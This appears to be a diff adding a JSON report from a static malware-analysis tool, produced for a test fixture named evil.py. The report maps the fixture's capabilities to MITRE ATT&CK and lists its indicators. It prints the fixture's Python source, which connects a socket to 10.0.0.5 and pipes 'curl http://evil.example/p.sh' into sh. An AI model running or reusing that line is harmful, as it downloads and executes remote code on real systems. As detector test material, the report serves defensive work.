@@ -1,0 +1,160 @@
+{
+  "tool": "Event Zero",
+  "version": "2.0.0",
+  "file": "fixtures/evil.py",
+  "filename": "evil.py",
+  "size_bytes": 113,
+  "hashes": {
+    "md5": "4cd18b20f5df6ece6c87c40aac383b6d",
+    "sha1": "d7f6d25dc28e0589c04741b1269b107814bb4001",
+    "sha256": "bb0b01e6cfc084f93307bb793a97712b584bff2266b5699d37ad169fdedd39cd",
+    "sha512": "5ace84cc7de9eeecf498afc034c2369bdfc2db3c374c1a3d4c66b055236bd7d00ea7897c9c68fcac6b28ea74dd205d854eabcfee8103fee709f5e1eb69aa2533"
+  },
+  "eicar_test_file": false,
+  "format": {
+    "format": "text / script",
+    "architecture": "n/a",
+    "sections": [],
+    "imports": [],
+    "symbols": []
+  },
+  "parser_backend": "stdlib fallback parser (lief could not parse)",
+  "overall_entropy": 4.705,
+  "sections": [],
+  "packing_assessment": [
+    "No strong packing signal: whole-file entropy is 4.705/8.0 and no UPX markers were found. Low whole-file entropy can be pulled down by zero padding in Mach-O and ELF files, so this is not proof of no packing."
+  ],
+  "imports": [],
+  "symbols": [],
+  "strings": {
+    "count": 3,
+    "ascii_count": 3,
+    "utf16_count": 0,
+    "all": [
+      "import socket,os",
+      "s=socket.socket(); s.connect((\"10.0.0.5\",8080))",
+      "os.system(\"curl http://evil.example/p.sh | sh\")"
+    ],
+    "base64_decoded": [],
+    "xor_decoded": []
+  },
+  "disassembly": {
+    "available": true,
+    "note": "No disassembly for architecture n/a",
+    "instruction_count": 0,
+    "instructions": [],
+    "call_sites": []
+  },
+  "capabilities": [
+    {
+      "id": "net-socket",
+      "name": "Create a network socket",
+      "attack_id": "T1071.001",
+      "tactic": "Command and Control",
+      "technique": "Application Layer Protocol: Web Protocols",
+      "evidence": [
+        "string/text: socket"
+      ],
+      "explanation": "Opens a network socket, the first step in talking to another machine."
+    },
+    {
+      "id": "net-connect",
+      "name": "Connect to a remote host",
+      "attack_id": "T1071.001",
+      "tactic": "Command and Control",
+      "technique": "Application Layer Protocol",
+      "evidence": [
+        "string/text: connect("
+      ],
+      "explanation": "Connects out to an address and port. In malware this is often the command and control channel."
+    },
+    {
+      "id": "net-http",
+      "name": "Make HTTP requests",
+      "attack_id": "T1071.001",
+      "tactic": "Command and Control",
+      "technique": "Application Layer Protocol: Web Protocols",
+      "evidence": [
+        "string/text: curl",
+        "string/text: http://"
+      ],
+      "explanation": "Uses web traffic, which blends in with normal browsing and often passes firewalls."
+    },
+    {
+      "id": "exec-shell",
+      "name": "Run shell commands",
+      "attack_id": "T1059.004",
+      "tactic": "Execution",
+      "technique": "Command and Scripting Interpreter: Unix Shell",
+      "evidence": [
+        "string/text: os.system"
+      ],
+      "explanation": "Runs operating system commands, giving the sample the power of a user at a terminal."
+    },
+    {
+      "id": "exec-download-run",
+      "name": "Download and execute a payload",
+      "attack_id": "T1105",
+      "tactic": "Command and Control",
+      "technique": "Ingress Tool Transfer",
+      "evidence": [
+        "string/text: curl http",
+        "string/text: | sh"
+      ],
+      "explanation": "Downloads code from the internet and runs it. The file you have is then only a first stage."
+    }
+  ],
+  "script_analysis": {
+    "language": "Python",
+    "lines": 3,
+    "imports": [
+      "socket",
+      "os"
+    ],
+    "calls": [
+      "socket.socket",
+      "s.connect",
+      "os.system"
+    ]
+  },
+  "script_source_excerpt": "import socket,os\ns=socket.socket(); s.connect((\"10.0.0.5\",8080))\nos.system(\"curl http://evil.example/p.sh | sh\")\n",
+  "iocs": {
+    "urls": [
+      "http://evil.example/p.sh"
+    ],
+    "ip_addresses": [
+      "10.0.0.5"
+    ],
+    "domains": [],
+    "file_paths": []
+  },
+  "risk": {
+    "score": 70,
+    "verdict": "HIGH RISK",
+    "reasons": [
+      "Capability detected: exec-shell",
+      "Capability detected: exec-download-run",
+      "Capability detected: net-connect"
+    ]
+  },
+  "unknowns": [
+    "Runtime behaviour was not observed: the sample was never executed, so network traffic, timing, and environment checks it performs can only be inferred from static evidence.",
+    "Script was analysed as source text. Obfuscated or dynamically generated code in it (eval, exec of decoded strings) is flagged as a capability when seen, but its final payload cannot be known without running it in a sandbox."
+  ],
+  "plain_english": [
+    "This file is called evil.py and it is 113 bytes in size.",
+    "It is a text / script file for n/a.",
+    "Its fingerprint (SHA-256) is bb0b01e6cfc084f93307bb793a97712b584bff2266b5699d37ad169fdedd39cd. If anyone else reports this exact fingerprint, they are talking about the exact same file, byte for byte.",
+    "No imported functions could be listed. That can happen with scripts, stripped files, or formats the parser could not read in detail, and it is recorded as a gap rather than hidden.",
+    "Here is what the evidence says it can do:",
+    "- Create a network socket (MITRE ATT&CK T1071.001, Application Layer Protocol: Web Protocols): Opens a network socket, the first step in talking to another machine. Evidence: string/text: socket.",
+    "- Connect to a remote host (MITRE ATT&CK T1071.001, Application Layer Protocol): Connects out to an address and port. In malware this is often the command and control channel. Evidence: string/text: connect(.",
+    "- Make HTTP requests (MITRE ATT&CK T1071.001, Application Layer Protocol: Web Protocols): Uses web traffic, which blends in with normal browsing and often passes firewalls. Evidence: string/text: curl, string/text: http://.",
+    "- Run shell commands (MITRE ATT&CK T1059.004, Command and Scripting Interpreter: Unix Shell): Runs operating system commands, giving the sample the power of a user at a terminal. Evidence: string/text: os.system.",
+    "- Download and execute a payload (MITRE ATT&CK T1105, Ingress Tool Transfer): Downloads code from the internet and runs it. The file you have is then only a first stage. Evidence: string/text: curl http, string/text: | sh.",
+    "Packing check: No strong packing signal: whole-file entropy is 4.705/8.0 and no UPX markers were found. Low whole-file entropy can be pulled down by zero padding in Mach-O and ELF files, so this is not proof of no packing.",
+    "Network names and addresses written inside the file: URLs ['http://evil.example/p.sh'], IP addresses ['10.0.0.5'], domains none. A name written in a file is a lead, not proof the program contacts it.",
+    "Verdict: HIGH RISK (rule score 70/100).",
+    "What is not known: Runtime behaviour was not observed: the sample was never executed, so network traffic, timing, and environment checks it performs can only be inferred from static evidence. Script was analysed as source text. Obfuscated or dynamically generated code in it (eval, exec of decoded strings) is flagged as a capability when seen, but its final payload cannot be known without running it in a sandbox."
+  ]
+}
